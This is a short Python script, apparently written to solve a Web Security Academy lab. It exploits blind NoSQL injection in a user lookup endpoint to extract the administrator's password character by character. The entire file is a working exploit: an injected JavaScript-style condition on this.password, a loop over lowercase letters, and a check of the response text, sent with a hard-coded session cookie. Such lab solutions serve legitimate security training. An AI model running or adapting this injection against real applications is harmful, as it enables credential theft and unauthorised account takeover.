import requests, string
from urllib.parse import quote

quess = ''

url = 'https://0ada004004bd26d5805e1259009f00bb.web-security-academy.net/user/lookup?user='
chars = string.ascii_lowercase

session = '3z8SKXPe98XvFOyIxVmwVytMnBIUwJWy'

searching = True

position = 0

while searching:
        for char in chars:

            payload = f"administrator' && this.password[{position}] == '{char}' || 'a'=='b"
            encoded_payload = quote(payload)
            iurl = f"{url}{encoded_payload}"

            response = requests.get(iurl, cookies={'session': session})
            #print(iurl)


            if 'Could not find user' not in response.text:
                quess += char
                position += 1
                print("Current password: " + quess)
                break
        else:
            print("No more valid characters found")
            exit(1)